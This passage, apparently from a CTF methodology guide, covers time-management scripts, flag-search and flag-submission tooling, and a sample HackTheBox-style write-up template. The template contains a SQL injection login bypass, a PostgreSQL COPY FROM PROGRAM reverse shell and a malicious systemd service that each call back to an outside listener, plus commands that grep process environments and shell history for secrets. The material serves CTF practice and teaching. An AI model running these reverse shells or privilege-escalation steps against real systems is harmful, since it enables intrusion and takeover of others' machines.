    printf "║ Elapsed: %02d:%02d:%02d " $((elapsed/3600)) $(((elapsed%3600)/60)) $((elapsed%60))
    printf "Remaining: %02d:%02d:%02d " $((remaining/3600)) $(((remaining%3600)/60)) $((remaining%60))
    printf "Progress: %3d%% ║\n" $percent_complete
    echo "╠════════════════════════════════════════════════════════════╣"
    echo "║ MILESTONES                                                 ║"
    echo "╠════════════════════════════════════════════════════════════╣"
    
    for milestone in enumeration_complete vulnerability_identified initial_access user_flag privesc_enum root_flag; do
        if [ ${milestones[$milestone]} -gt 0 ]; then
            milestone_time=$((milestones[$milestone] - START_TIME))
            printf "║ [✓] %-30s %02d:%02d:%02d          ║\n" \
                "$milestone" $((milestone_time/3600)) $(((milestone_time%3600)/60)) $((milestone_time%60))
        else
            printf "║ [ ] %-30s --:--:--          ║\n" "$milestone"
        fi
    done
    
    echo "╠════════════════════════════════════════════════════════════╣"
    echo "║ CURRENT ACTIVITY                                           ║"
    echo "╠════════════════════════════════════════════════════════════╣"
    
    # Show running processes
    ps aux | grep -E "nmap|hydra|sqlmap|metasploit|msfconsole" | grep -v grep | \
    while read line; do
        cmd=$(echo $line | awk '{for(i=11;i<=NF;i++) printf $i" "}')
        printf "║ %-58s ║\n" "${cmd:0:58}"
    done
    
    echo "╠════════════════════════════════════════════════════════════╣"
    echo "║ RECOMMENDATIONS                                            ║"
    echo "╠════════════════════════════════════════════════════════════╣"
    
    if [ $remaining -lt 1800 ]; then
        echo "║ [!!!] CRITICAL: Less than 30 minutes remaining!           ║"
        echo "║       Focus on completing current path only               ║"
    elif [ $remaining -lt 3600 ]; then
        echo "║ [!] WARNING: Less than 1 hour remaining                   ║"
        echo "║     Avoid starting new complex exploitation paths         ║"
    elif [ ${milestones[initial_access]} -eq 0 ] && [ $elapsed -gt 3600 ]; then
        echo "║ [!] No access after 1 hour - consider strategy change     ║"
    fi
    
    echo "╚════════════════════════════════════════════════════════════╝"
}

# Update dashboard every 10 seconds
watch_dashboard() {
    while [ $(time_remaining) -gt 0 ]; do
        display_dashboard
        sleep 10
    done
    
    echo "[!!!] TIME EXPIRED - Finalizing documentation"
}
```

**Post-Exploitation Time Efficiency:**

```bash
# Quick flag capture and documentation
rapid_flag_capture() {
    echo "[*] Initiating rapid flag enumeration"
    
    # Common flag locations
    flag_locations=(
        "/root/root.txt"
        "/root/flag.txt"
        "/home/*/user.txt"
        "/home/*/flag.txt"
        "C:/Users/Administrator/Desktop/root.txt"
        "C:/Users/*/Desktop/user.txt"
    )
    
    for location in "${flag_locations[@]}"; do
        timeout 5 cat $location 2>/dev/null && \
            echo "[+] Flag found: $location" | tee -a flags.txt
    done
    
    # Recursive search (time-limited)
    timeout 60 find / -name "*flag*" -o -name "*root.txt" -o -name "*user.txt" 2>/dev/null | \
    while read file; do
        echo "[*] Potential flag: $file"
        timeout 2 cat "$file" 2>/dev/null
    done | tee -a flags.txt
}

# Minimal documentation for time pressure
quick_documentation() {
    cat > SOLUTION.md << EOF
# CTF Solution - $(date)

## Target Information
- IP: $TARGET
- Difficulty: [Easy/Medium/Hard]

## Exploitation Path
1. Initial Access: [method]
   - Service: [service:port]
   - Vulnerability: [CVE/technique]
   - Exploit: [name/command]

2. User Flag
   - Location: [path]
   - Hash: $(cat flags.txt | grep user)

3. Privilege Escalation
   - Method: [technique]
   - Vulnerability: [specific vuln]

4. Root Flag
   - Location: [path]
   - Hash: $(cat flags.txt | grep root)

## Timeline
- Start: $(date -d @$START_TIME)
- Initial Access: $(date -d @${milestones[initial_access]})
- Root: $(date -d @${milestones[root_flag]})
- Total Time: $(($(time_elapsed) / 60)) minutes

## Key Commands
\`\`\`bash
[paste critical commands here]
\`\`\`

## Lessons Learned
- [key takeaway 1]
- [key takeaway 2]
EOF
    
    echo "[+] Quick documentation completed: SOLUTION.md"
}
```

**Multi-Target Time Optimization:**

```bash
# When multiple targets are available, optimize time across all
multi_target_time_management() {
    targets_file=$1
    total_targets=$(wc -l < $targets_file)
    time_per_target=$((TOTAL_TIME / total_targets))
    
    echo "[*] Multi-target mode: $total_targets targets"
    echo "[*] Allocating $((time_per_target / 60)) minutes per target"
    
    target_num=0
    while read target; do
        ((target_num++))
        target_start=$(date +%s)
        target_deadline=$((target_start + time_per_target))
        
        echo ""
        echo "╔════════════════════════════════════════╗"
        echo "║ Target $target_num/$total_targets: $target"
        echo "║ Deadline: $(date -d @$target_deadline +%H:%M:%S)"
        echo "╚════════════════════════════════════════╝"
        
        # Quick assessment
        timeout 300 nmap -sV --top-ports 100 $target -oN target_${target_num}_quick.txt
        
        # Prioritize based on quick scan
        if grep -qE "vsftpd 2.3.4|ProFTPD 1.3.3c|Apache 2.4.49" target_${target_num}_quick.txt; then
            echo "[!] High-value target detected - extending time allocation"
            target_deadline=$((target_deadline + 900))  # +15 minutes
        fi
        
        # Exploit with deadline
        while [ $(date +%s) -lt $target_deadline ]; do
            # Attempt exploits
            if [ ${milestones[root_flag]} -gt 0 ]; then
                echo "[+] Target $target_num completed successfully"
                break
            fi
            
            # Check remaining time
            if [ $((target_deadline - $(date +%s))) -lt 300 ]; then
                echo "[!] 5 minutes remaining on target - attempting emergency exploits"
                emergency_exploitation $target
                break
            fi
        done
        
        # Move to next target
        echo "[*] Moving to next target ($(( $(time_remaining) / 60 )) minutes remaining overall)"
        
    done < $targets_file
}
```

---

### Important Related Topics

For comprehensive CTF exploitation phase mastery, consider studying:

- **Enumeration Automation Frameworks** - OSINT, service fingerprinting, and automated discovery
- **Exploitation Frameworks** - Metasploit, Empire, Covenant for efficient payload delivery
- **Post-Exploitation Persistence** - maintaining access during time-constrained scenarios
- **CTF-Specific Tools** - pwntools, ROPgadget, and challenge-specific exploitation libraries

---

## CTF Documentation & Flag Submission

### Flag Format Recognition

#### Common Flag Formats

**Standard CTF flag patterns:**

```regex
# HackTheBox
HTB{[a-zA-Z0-9_]+}
Example: HTB{p0stgr3s_superus3r_pwn3d}

# TryHackMe
THM{[a-zA-Z0-9_]+}
Example: THM{sql_injection_master}

# PicoCTF
picoCTF{[a-zA-Z0-9_]+}
Example: picoCTF{f1nd_th3_fl4g_1n_db}

# CTFtime generic
flag{[a-zA-Z0-9_]+}
FLAG{[a-zA-Z0-9_]+}
Example: flag{d4tab4s3_exf1ltr4t10n}

# MD5/SHA hash format
[a-f0-9]{32}  # MD5
[a-f0-9]{40}  # SHA1
[a-f0-9]{64}  # SHA256
Example: 5f4dcc3b5aa765d61d8327deb882cf99

# UUID format
[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}
Example: 550e8400-e29b-41d4-a716-446655440000

# Custom alphanumeric
[A-Z0-9]{20,40}
Example: A3F8D9E2C1B5A7F9E3D8C2B1A5F7E9D3
```

#### Flag Location Identification

**Common flag locations in systems:**

```bash
# Linux filesystem
/root/flag.txt
/root/root.txt
/home/user/user.txt
/home/*/flag.txt
/var/www/flag.txt
/opt/flag.txt
/tmp/flag.txt
/.flag
/etc/flag

# Windows filesystem
C:\Users\Administrator\Desktop\flag.txt
C:\Users\Administrator\Desktop\root.txt
C:\Users\<username>\Desktop\user.txt
C:\flag.txt
C:\Windows\System32\flag.txt

# Web application paths
/flag
/flag.txt
/admin/flag.txt
/api/flag
/.git/flag.txt
/backup/flag.txt
```

**Database flag locations:**

```sql
-- PostgreSQL
SELECT * FROM flags;
SELECT * FROM ctf.flag;
SELECT * FROM public.flag;
SELECT description FROM pg_shdescription;  -- Sometimes hidden in metadata

-- MySQL
SELECT * FROM ctf.flags;
SELECT * FROM information_schema.tables WHERE table_name LIKE '%flag%';

-- Check table/column comments
SELECT table_name,table_comment FROM information_schema.tables;
SELECT column_name,column_comment FROM information_schema.columns;
```

**Process and memory locations:**

```bash
# Check running processes for flags
ps aux | grep -i flag
ps aux | strings | grep -E 'flag{|HTB{|THM{'

# Environment variables
env | grep -i flag
cat /proc/*/environ | strings | grep -i flag

# Command history
cat ~/.bash_history | grep -i flag
cat ~/.zsh_history | grep -i flag
history | grep -i flag
```

#### Flag Extraction Techniques

**Automated flag finding:**

```bash
#!/bin/bash
# Comprehensive flag finder script

FLAG_PATTERNS=(
    'HTB\{[a-zA-Z0-9_]+\}'
    'THM\{[a-zA-Z0-9_]+\}'
    'flag\{[a-zA-Z0-9_]+\}'
    'FLAG\{[a-zA-Z0-9_]+\}'
    'picoCTF\{[a-zA-Z0-9_]+\}'
    '[a-f0-9]{32}'  # MD5
)

SEARCH_PATHS=(
    "/root"
    "/home"
    "/var/www"
    "/opt"
    "/tmp"
    "/etc"
)

echo "[*] Searching for flags..."

for path in "${SEARCH_PATHS[@]}"; do
    if [ -d "$path" ]; then
        for pattern in "${FLAG_PATTERNS[@]}"; do
            find "$path" -type f 2>/dev/null | xargs grep -aoE "$pattern" 2>/dev/null | sort -u
        done
    fi
done

# Check common filenames
find / -name "*flag*" -type f 2>/dev/null
find / -name "user.txt" -o -name "root.txt" 2>/dev/null

# Check for base64 encoded flags
find / -type f -exec grep -l "ZmxhZ3" {} \; 2>/dev/null  # "flag" in base64
```

**Windows flag finder (PowerShell):**

```powershell
# Flag finder for Windows
$FlagPatterns = @(
    'HTB\{[a-zA-Z0-9_]+\}',
    'THM\{[a-zA-Z0-9_]+\}',
    'flag\{[a-zA-Z0-9_]+\}',
    '[a-f0-9]{32}'
)

$SearchPaths = @(
    'C:\Users',
    'C:\',
    'C:\inetpub',
    'C:\Windows\Temp'
)

foreach ($path in $SearchPaths) {
    foreach ($pattern in $FlagPatterns) {
        Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue | 
            Select-String -Pattern $pattern | 
            Select-Object -Unique Path, Line
    }
}

# Find files named flag
Get-ChildItem -Path C:\ -Recurse -Filter "*flag*" -File -ErrorAction SilentlyContinue
```

#### Flag Format Validation

**Verify flag format before submission:**

```python
#!/usr/bin/env python3
import re
import hashlib

def validate_flag(flag, flag_type='generic'):
    """
    Validate flag format before submission
    """
    patterns = {
        'htb': r'^HTB\{[a-zA-Z0-9_]+\}$',
        'thm': r'^THM\{[a-zA-Z0-9_]+\}$',
        'pico': r'^picoCTF\{[a-zA-Z0-9_]+\}$',
        'generic': r'^flag\{[a-zA-Z0-9_]+\}$',
        'md5': r'^[a-f0-9]{32}$',
        'sha1': r'^[a-f0-9]{40}$',
        'sha256': r'^[a-f0-9]{64}$'
    }
    
    if flag_type in patterns:
        if re.match(patterns[flag_type], flag.strip()):
            print(f"[+] Valid {flag_type.upper()} flag format")
            return True
        else:
            print(f"[-] Invalid {flag_type.upper()} flag format")
            return False
    
    # Check against all patterns
    for name, pattern in patterns.items():
        if re.match(pattern, flag.strip()):
            print(f"[+] Detected {name.upper()} flag format")
            return True
    
    print("[-] Unknown flag format")
    return False

# Usage
flag = input("Enter flag: ")
validate_flag(flag, 'htb')
```

**Handle encoded flags:**

```bash
#!/bin/bash
# Decode potentially encoded flags

FLAG="$1"

echo "[*] Original: $FLAG"
echo ""

# Base64 decode
echo "[*] Base64 decode attempt:"
echo "$FLAG" | base64 -d 2>/dev/null
echo ""

# Hex decode
echo "[*] Hex decode attempt:"
echo "$FLAG" | xxd -r -p 2>/dev/null
echo ""

# URL decode
echo "[*] URL decode attempt:"
python3 -c "import urllib.parse; print(urllib.parse.unquote('$FLAG'))" 2>/dev/null
echo ""

# ROT13
echo "[*] ROT13 decode:"
echo "$FLAG" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
echo ""

# Check if it's a hash that needs cracking
if [[ $FLAG =~ ^[a-f0-9]{32}$ ]]; then
    echo "[*] Detected MD5 hash - may need cracking"
elif [[ $FLAG =~ ^[a-f0-9]{64}$ ]]; then
    echo "[*] Detected SHA256 hash - may need cracking"
fi
```

### Token Submission Procedures

#### HackTheBox Submission Process

**HTB flag submission via CLI:**

```bash
# Install HTB CLI tool
pip3 install htb-cli

# Login
htb login

# Submit flag
htb submit <machine_name> <flag>
htb submit "Postgres" "HTB{p0stgr3s_superus3r_pwn3d}"

# Check machine status
htb status <machine_name>
htb pwned
```

**HTB API submission (programmatic):**

```python
#!/usr/bin/env python3
import requests
import json

def submit_htb_flag(api_token, machine_id, flag, difficulty=50):
    """
    Submit flag to HackTheBox via API
    [Unverified: API endpoints may change]
    """
    url = f"https://www.hackthebox.eu/api/machines/{machine_id}/own"
    
    headers = {
        'Authorization': f'Bearer {api_token}',
        'Content-Type': 'application/json'
    }
    
    data = {
        'flag': flag,
        'difficulty': difficulty
    }
    
    response = requests.post(url, headers=headers, json=data)
    
    if response.status_code == 200:
        result = response.json()
        if result.get('success'):
            print(f"[+] Flag accepted!")
            print(f"[+] Points earned: {result.get('points', 'N/A')}")
            return True
        else:
            print(f"[-] Flag rejected: {result.get('message')}")
            return False
    else:
        print(f"[-] Submission failed: {response.status_code}")
        return False

# Usage
API_TOKEN = "your_htb_api_token"
MACHINE_ID = 123
FLAG = "HTB{p0stgr3s_superus3r_pwn3d}"

submit_htb_flag(API_TOKEN, MACHINE_ID, FLAG)
```

#### TryHackMe Submission Process

**THM flag submission checklist:**

```bash
# Access room
# Navigate to task section
# Enter flag in answer field
# Click "Submit"

# Common submission errors to avoid:
# - Extra whitespace before/after flag
# - Wrong case (some flags are case-sensitive)
# - Missing braces {}
# - Copy-paste issues (hidden characters)
```

**THM API interaction (unofficial):**

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

def submit_thm_answer(session_cookie, room_code, task_id, answer):
    """
    Submit answer to TryHackMe room
    [Unverified: API structure may differ]
    """
    url = f"https://tryhackme.com/api/room/{room_code}/task/{task_id}/answer"
    
    cookies = {
        'connect.sid': session_cookie
    }
    
    data = {
        'answer': answer.strip()
    }
    
    response = requests.post(url, cookies=cookies, json=data)
    
    if response.status_code == 200:
        result = response.json()
        if result.get('correct'):
            print("[+] Answer correct!")
            return True
        else:
            print("[-] Answer incorrect")
            return False
    else:
        print(f"[-] Submission error: {response.status_code}")
        return False
```

#### Generic CTF Platform Submission

**CTFd platform submission:**

```python
#!/usr/bin/env python3
import requests

def submit_ctfd_flag(base_url, token, challenge_id, flag):
    """
    Submit flag to CTFd-based platform
    """
    url = f"{base_url}/api/v1/challenges/attempt"
    
    headers = {
        'Authorization': f'Token {token}',
        'Content-Type': 'application/json'
    }
    
    data = {
        'challenge_id': challenge_id,
        'submission': flag.strip()
    }
    
    response = requests.post(url, headers=headers, json=data)
    
    if response.status_code == 200:
        result = response.json()
        if result.get('data', {}).get('status') == 'correct':
            print("[+] Flag correct!")
            print(f"[+] Points: {result.get('data', {}).get('value')}")
            return True
        else:
            print("[-] Flag incorrect")
            return False
    else:
        print(f"[-] Submission failed: {response.status_code}")
        return False

# Usage
submit_ctfd_flag(
    base_url="https://ctf.example.com",
    token="your_api_token",
    challenge_id=42,
    flag="flag{database_pwned}"
)
```

#### Submission Best Practices

**Pre-submission checklist:**

```bash
#!/bin/bash
# Flag submission verification script

FLAG="$1"

echo "========================================="
echo "Flag Submission Pre-Check"
echo "========================================="
echo ""

# 1. Trim whitespace
CLEANED_FLAG=$(echo "$FLAG" | xargs)
echo "[*] Cleaned flag: $CLEANED_FLAG"
echo ""

# 2. Check format
if [[ $CLEANED_FLAG =~ ^(HTB|THM|flag|FLAG|picoCTF)\{.+\}$ ]]; then
    echo "[+] Flag format appears valid"
else
    echo "[!] Warning: Unusual flag format"
fi
echo ""

# 3. Check length
LENGTH=${#CLEANED_FLAG}
echo "[*] Flag length: $LENGTH characters"
if [ $LENGTH -lt 10 ]; then
    echo "[!] Warning: Flag seems short"
fi
echo ""

# 4. Check for common issues
if [[ $CLEANED_FLAG == *$'\n'* ]]; then
    echo "[!] Warning: Flag contains newline"
fi

if [[ $CLEANED_FLAG == *" "* ]]; then
    echo "[!] Warning: Flag contains spaces"
fi

# 5. Display flag variants
echo "[*] Flag variants to try:"
echo "    Original:  $FLAG"
echo "    Trimmed:   $CLEANED_FLAG"
echo "    Uppercase: ${CLEANED_FLAG^^}"
echo "    Lowercase: ${CLEANED_FLAG,,}"
echo ""

echo "========================================="
echo "Ready to submit? (Press Enter)"
read
```

**Track submission attempts:**

```python
#!/usr/bin/env python3
import json
import datetime

class FlagTracker:
    def __init__(self, filename='flag_attempts.json'):
        self.filename = filename
        self.load_attempts()
    
    def load_attempts(self):
        try:
            with open(self.filename, 'r') as f:
                self.attempts = json.load(f)
        except FileNotFoundError:
            self.attempts = []
    
    def save_attempts(self):
        with open(self.filename, 'w') as f:
            json.dump(self.attempts, f, indent=2)
    
    def record_attempt(self, challenge, flag, success, notes=""):
        attempt = {
            'timestamp': datetime.datetime.now().isoformat(),
            'challenge': challenge,
            'flag': flag,
            'success': success,
            'notes': notes
        }
        self.attempts.append(attempt)
        self.save_attempts()
        
        if success:
            print(f"[+] Flag recorded as CORRECT for {challenge}")
        else:
            print(f"[-] Flag recorded as INCORRECT for {challenge}")
    
    def get_challenge_attempts(self, challenge):
        return [a for a in self.attempts if a['challenge'] == challenge]
    
    def show_stats(self):
        total = len(self.attempts)
        successful = len([a for a in self.attempts if a['success']])
        print(f"\n=== Submission Statistics ===")
        print(f"Total attempts: {total}")
        print(f"Successful: {successful}")
        print(f"Success rate: {successful/total*100:.1f}%" if total > 0 else "N/A")

# Usage
tracker = FlagTracker()
tracker.record_attempt(
    challenge="PostgreSQL Machine",
    flag="HTB{p0stgr3s_superus3r_pwn3d}",
    success=True,
    notes="Found in /root/flag.txt after pg_read_file exploitation"
)
tracker.show_stats()
```

### Write-up Documentation

#### Write-up Structure Template

**Comprehensive CTF write-up format:**

````markdown
# Machine/Challenge Name - CTF Write-up

**Author:** Your Name  
**Date:** 2024-XX-XX  
**Difficulty:** Easy/Medium/Hard  
**Platform:** HackTheBox/TryHackMe/Custom  
**Machine IP:** 10.10.10.XXX  
**Tags:** PostgreSQL, SQL Injection, Linux, Privilege Escalation

---

## Executive Summary

Brief overview of the machine/challenge, primary attack vectors, and key findings.

**Key Vulnerabilities:**
- SQL Injection in login form (CVE-XXXX-XXXX if applicable)
- PostgreSQL superuser misconfiguration
- Weak file permissions on /etc/passwd

**Flags Obtained:**
- User Flag: `HTB{us3r_fl4g_h3r3}`
- Root Flag: `HTB{r00t_fl4g_h3r3}`

---

## Enumeration

### Initial Reconnaissance

**Port Scanning:**
```bash
nmap -sC -sV -oA nmap/initial 10.10.10.XXX
```

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1
80/tcp   open  http    Apache httpd 2.4.41
5432/tcp open  postgresql PostgreSQL DB 13.0
```

### Service Enumeration

#### HTTP (Port 80)

- Technology stack: Apache 2.4.41, PHP 7.4
- Directory enumeration revealed `/admin` endpoint
- Login form present at `/admin/login.php`

```bash
gobuster dir -u http://10.10.10.XXX -w /usr/share/wordlists/dirb/common.txt
```

#### PostgreSQL (Port 5432)

- Version: PostgreSQL 13.0
- Anonymous access denied
- Default credentials unsuccessful

---

## Exploitation

### Initial Access

#### SQL Injection in Login Form

**Vulnerability Discovery:** Testing login form at `/admin/login.php` with basic payloads:

```sql
Username: admin' OR '1'='1'-- 
Password: anything
```

Result: Authentication bypass successful

**Exploitation:**

```bash
sqlmap -u "http://10.10.10.XXX/admin/login.php" \
       --data="username=admin&password=test" \
       --dbs --batch
```

**Findings:**

- Database: `webapp`
- Tables: `users`, `credentials`
- Extracted PostgreSQL credentials: `dbuser:P@ssw0rd123!`

#### PostgreSQL Access

Connected to PostgreSQL using extracted credentials:

```bash
psql -h 10.10.10.XXX -U dbuser -d webapp
```

**User Flag Location:**

```sql
SELECT pg_read_file('/home/postgres/user.txt');
```

**Flag:** `HTB{us3r_fl4g_h3r3}`

---

## Privilege Escalation

### PostgreSQL Superuser Exploitation

**Discovery:** Checked current user privileges:

```sql
SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;
-- Result: dbuser | t (superuser!)
```

### Code Execution via COPY PROGRAM

**Method 1: Reverse Shell**

```sql
DROP TABLE IF EXISTS shell;
CREATE TABLE shell(output TEXT);
COPY shell FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"';
```

Netcat listener:

```bash
nc -lvnp 4444
```

**Result:** Shell as `postgres` user

### Privilege Escalation to Root

**Discovery:**

```bash
sudo -l
# User postgres may run (ALL) NOPASSWD: /usr/bin/systemctl
```

**Exploitation:** Created malicious systemd service:

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.5/5555 0>&1"
[Install]
WantedBy=multi-user.target' > $TF

sudo systemctl link $TF
sudo systemctl start $(basename $TF)
```

**Root Flag:**

```bash
cat /root/root.txt
```

**Flag:** `HTB{r00t_fl4g_h3r3}`

---

## Key Findings Summary

### Vulnerabilities Identified

1. **SQL Injection (High)**
    
    - Location: `/admin/login.php`
    - Impact: Authentication bypass, database access
    - Remediation: Use parameterized queries, input validation
2. **PostgreSQL Superuser Misconfiguration (Critical)**
    
    - Impact: Remote code execution
    - Remediation: Remove superuser privileges from web application database user
3. **Sudo Misconfiguration (Critical)**
    
    - Impact: Privilege escalation to root
    - Remediation: Restrict sudo permissions for service accounts

---

## Tools Used

- nmap - Port scanning
- gobuster - Directory enumeration
- sqlmap - SQL injection exploitation
- psql - PostgreSQL client
- netcat - Reverse shell listener

---

## Lessons Learned

1. Always check database user privileges after gaining access
2. PostgreSQL superuser can achieve RCE via multiple methods
3. Sudo misconfigurations are common privilege escalation vectors
4. Input validation is critical for preventing SQL injection

---

## Timeline

- 00:00 - Initial nmap scan
- 00:15 - HTTP enumeration and login form discovery
- 00:30 - SQL injection successful
- 00:45 - PostgreSQL credentials extracted
- 01:00 - User flag obtained
- 01:15 - Superuser privileges identified
- 01:30 - Reverse shell obtained
- 01:45 - Sudo misconfiguration discovered
- 02:00 - Root flag obtained

**Total Time:** 2 hours

---

## References

- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [GTFOBins - systemctl](https://gtfobins.github.io/gtfobins/systemctl/)

````

#### Automated Write-up Generator

```python
#!/usr/bin/env python3
import datetime

class WriteupGenerator:
    def __init__(self, machine_name, platform="HackTheBox"):
        self.machine_name = machine_name
        self.platform = platform
        self.date = datetime.date.today().isoformat()
        self.sections = {}
    
    def add_section(self, section_name, content):
        self.sections[section_name] = content
    
    def generate_markdown(self):
        template = f"""# {self.machine_name} - {self.platform} Write-up

**Date:** {self.date}  
**Platform:** {self.platform}

---

## Executive Summary

{self.sections.get('summary', '[Add summary here]')}

---

## Enumeration

{self.sections.get('enumeration', '[Add enumeration details]')}

---

## Exploitation

{self.sections.get('exploitation', '[Add exploitation steps]')}

---

## Privilege Escalation

{self.sections.get('privesc', '[Add privilege escalation steps]')}

---

## Flags

{self.sections.get('flags', '[Add flags here]')}

---

## Lessons Learned

{self.sections.get('lessons', '[Add lessons learned]')}
"""
        return template
    
    def save_writeup(self, filename=None):
        if not filename:
            filename = f"{self.machine_name.replace(' ', '_')}_writeup.md"
        
        content = self.generate_markdown()
        with open(filename, 'w') as f:
            f.write(content)
        
        print(f"[+] Write-up saved to {filename}")

# Usage
writeup = WriteupGenerator("PostgreSQL Machine", "HackTheBox")
writeup.add_section('summary', 'Machine involving SQL injection and PostgreSQL exploitation')
writeup.add_section('flags', 'User: HTB{user_flag}\nRoot: HTB{root_flag}')
writeup.save_writeup()
````

#### Screenshot Documentation

**Screenshot naming convention:**

```bash
# Organize screenshots systematically
mkdir -p writeup/{enumeration,exploitation,privesc,flags}

# Naming format: STEP_DESCRIPTION_TIMESTAMP.png
01_nmap_scan_20240115_143022.png
02_gobuster_results_20240115_143521.png
03_sqli_authentication_bypass_20240115_144112.png
04_postgresql_connection_20240115_145033.png
05_user_flag_20240115_150844.png
06_sudo_privileges_20240115_151522.png
07_root_shell_20240115_152109.png
08_root_flag_20240115_152245.png
```

**Screenshot automation:**

```bash
#!/bin/bash
# Automated screenshot capture with timestamping

SCREENSHOT_DIR="writeup/screenshots"
mkdir -p "$SCREENSHOT_DIR"

take_screenshot() {
    local description="$1"
    local timestamp=$(date +"%Y%m%d_%H%M%S")
    local filename="${SCREENSHOT_DIR}/${timestamp}_${description}.png"
    
    # Using scrot (Linux)
    scrot -s "$filename"
    
    # Or using gnome-screenshot
    # gnome-screenshot -f "$filename"
    
    echo "[+] Screenshot saved: $filename"
}

# Usage
take_screenshot "nmap_initial_scan"
take_screenshot "sql_injection_success"
take_screenshot "user_flag_capture"
```

### Lessons Learned Capture

#### Structured Lessons Template

````markdown
## Lessons Learned - [Machine/Challenge Name]

### Technical Lessons

#### 1. [Vulnerability/Technique Name]

**What I Learned:**
- Key concept or technique discovered
- How the vulnerability works
- Why it was exploitable

**Application:**
- When to look for this vulnerability in future CTFs
- Tools/commands that are most effective
- Common misconfigurations to identify

**Mistakes Made:**
- What didn't work initially
- Time wasted on wrong approaches
- How to avoid these mistakes in future

#### 2. [Next Lesson...]

---

### Tool Proficiency

**New Tools Learned:**
- Tool name: Brief description and use case
- Commands/syntax that were particularly useful

**Tool Improvements:**
- Existing tools used more effectively
- New flags or options discovered

---

### Time Management

**What Worked:**
- Effective enumeration strategies
- Quick wins and shortcuts

**What Didn't Work:**
- Rabbit holes pursued
- Time-consuming dead ends

**Improvements for Next Time:**
- More systematic approach needed in [area]
- Better documentation during exploitation

---

### Mindset and Methodology

**Breakthroughs:**
- When did progress happen?
- What triggered the "aha" moment?

**Frustrations:**
- Stuck points and how they were overcome
- Resources consulted (forums, documentation, etc.)

---

### Knowledge Gaps Identified

**Need to Research:**
- Topics that were unfamiliar
- Concepts that need deeper understanding

**Practice Needed:**
- Skills that need more repetition
- Similar machines/challenges to attempt

---

### Quick Reference Notes

**Commands to Remember:**
```bash
[Add useful commands discovered]
````

**Resources:**

- Links to useful documentation
- Similar writeups for reference
- Tools or scripts created
#### Lessons Database

```python
#!/usr/bin/env python3
import json
import datetime

class LessonsDatabase:
    def __init__(self, filename='lessons_learned.json'):
        self.filename = filename
        self.lessons = self.load_lessons()
    
    def load_lessons(self):
        try:
            with open(self.filename, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            return []
    
    def save_lessons(self):
        with open(self.filename, 'w') as f:
            json.dump(self.lessons, f, indent=2)
    
    def add_lesson(self, category, title, description, machine, tags=None):
        lesson = {
            'id': len(self.lessons) + 1,
            'timestamp': datetime.datetime.now().isoformat(),
            'category': category,
            'title': title,
            'description': description,
            'machine': machine,
            'tags': tags or []
        }
        self.lessons.append(lesson)
        self.save_lessons()
        print(f"[+] Lesson recorded: {title}")
    
    def search_lessons(self, keyword):
        results = []
        for lesson in self.lessons:
            if (keyword.lower() in lesson['title'].lower() or 
                keyword.lower() in lesson['description'].lower() or
                keyword.lower() in ' '.join(lesson['tags']).lower()):
                results.append(lesson)
        return results
    
    def get_by_category(self, category):
        return [l for l in self.lessons if l['category'] == category]
    
    def display_lesson(self, lesson):
        print(f"\n{'='*60}")
        print(f"Lesson #{lesson['id']}: {lesson['title']}")
        print(f"Category: {lesson['category']}")
        print(f"Machine: {lesson['machine']}")
        print(f"Date: {lesson['timestamp'][:10]}")
        print(f"Tags: {', '.join(lesson['tags'])}")
        print(f"{'-'*60}")
        print(lesson['description'])
        print(f"{'='*60}\n")
    
    def generate_summary(self):
        categories = {}
        for lesson in self.lessons:
            cat = lesson['category']
            categories[cat] = categories.get(cat, 0) + 1
        
        print("\n=== Lessons Learned Summary ===")
        print(f"Total lessons recorded: {len(self.lessons)}")
        print("\nBy category:")
        for cat, count in sorted(categories.items()):
            print(f"  {cat}: {count}")

# Usage
db = LessonsDatabase()

db.add_lesson(
    category="SQL Injection",
    title="PostgreSQL COPY PROGRAM for RCE",
    description="""
    Learned that PostgreSQL superusers can execute system commands using:
    COPY table FROM PROGRAM 'command'
    
    Key requirements:
    - Superuser privileges required
    - PostgreSQL version 9.3+
    - Can be used for reverse shells, file operations, etc.
    
    Always check user privileges with:
    SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;
    """,
    machine="PostgreSQL Machine - HTB",
    tags=["postgresql", "rce", "database", "superuser"]
)

db.add_lesson(
    category="Enumeration",
    title="Always check sudo -l after initial access",
    description="""
    Mistake: Spent 30 minutes looking for SUID binaries and kernel exploits
    before checking sudo privileges
    Solution: Always run 'sudo -l' immediately after gaining shell access.
    This is a quick check that often reveals easy privilege escalation paths.
    
    Checklist for initial shell access:
    1. sudo -l
    2. Check for SUID binaries
    3. Examine cron jobs
    4. Review running services
    """,
    machine="PostgreSQL Machine - HTB",
    tags=["privesc", "sudo", "methodology", "enumeration"]
)

# Search lessons
print("\nSearching for PostgreSQL lessons:")
results = db.search_lessons("postgresql")
for lesson in results:
    db.display_lesson(lesson)

# Generate summary
db.generate_summary()
```

#### Technique Effectiveness Tracker

```python
#!/usr/bin/env python3
import json
from collections import defaultdict

class TechniqueTracker:
    def __init__(self, filename='technique_stats.json'):
        self.filename = filename
        self.stats = self.load_stats()
    
    def load_stats(self):
        try:
            with open(self.filename, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            return {'techniques': {}, 'tools': {}}
    
    def save_stats(self):
        with open(self.filename, 'w') as f:
            json.dump(self.stats, f, indent=2)
    
    def record_technique(self, technique_name, success=True, time_spent=0, notes=""):
        if technique_name not in self.stats['techniques']:
            self.stats['techniques'][technique_name] = {
                'attempts': 0,
                'successes': 0,
                'total_time': 0,
                'notes': []
            }
        
        tech = self.stats['techniques'][technique_name]
        tech['attempts'] += 1
        if success:
            tech['successes'] += 1
        tech['total_time'] += time_spent
        if notes:
            tech['notes'].append(notes)
        
        self.save_stats()
    
    def record_tool(self, tool_name, effective=True, use_case=""):
